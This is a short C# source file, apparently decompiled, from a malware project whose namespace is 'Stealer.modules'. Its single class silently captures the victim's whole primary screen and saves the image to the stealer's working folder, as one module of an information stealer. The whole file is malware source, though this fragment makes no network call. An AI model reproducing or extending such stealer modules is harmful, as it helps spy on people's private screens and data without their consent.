using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Stealer.modules
{
	// Token: 0x0200002D RID: 45
	internal class ScreenDektop
	{
		// Token: 0x060000DC RID: 220 RVA: 0x0000A588 File Offset: 0x00008788
		public static void GetScreenshot(string filename = "screenshot.jpg")
		{
			string path = Program.path;
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
			Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
			bitmap.Save(path + "\\" + filename, ImageFormat.Png);
		}
	}
}
